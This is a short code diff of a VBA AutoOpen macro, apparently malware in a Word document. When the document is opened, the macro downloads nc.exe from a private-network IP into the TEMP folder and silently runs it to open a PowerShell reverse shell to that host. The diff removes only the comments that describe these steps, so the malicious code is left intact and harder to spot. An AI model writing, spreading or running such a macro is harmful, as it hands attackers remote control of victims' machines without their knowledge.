@@ -4,7 +4,6 @@ Sub AutoOpen()
     strUrl = "http://192.168.31.186:8888/nc.exe"
     strPath = Environ("TEMP") & "\nc.exe"
 
-    ' Download nc.exe
     With CreateObject("Microsoft.XMLHTTP")
         .Open "GET", strUrl, False
         .Send
@@ -18,6 +17,5 @@ Sub AutoOpen()
         End If
     End With
 
-    ' Execute silently
     Shell "cmd.exe /c " & strPath & " 192.168.31.186 5555 -e powershell", vbHide
 End Sub
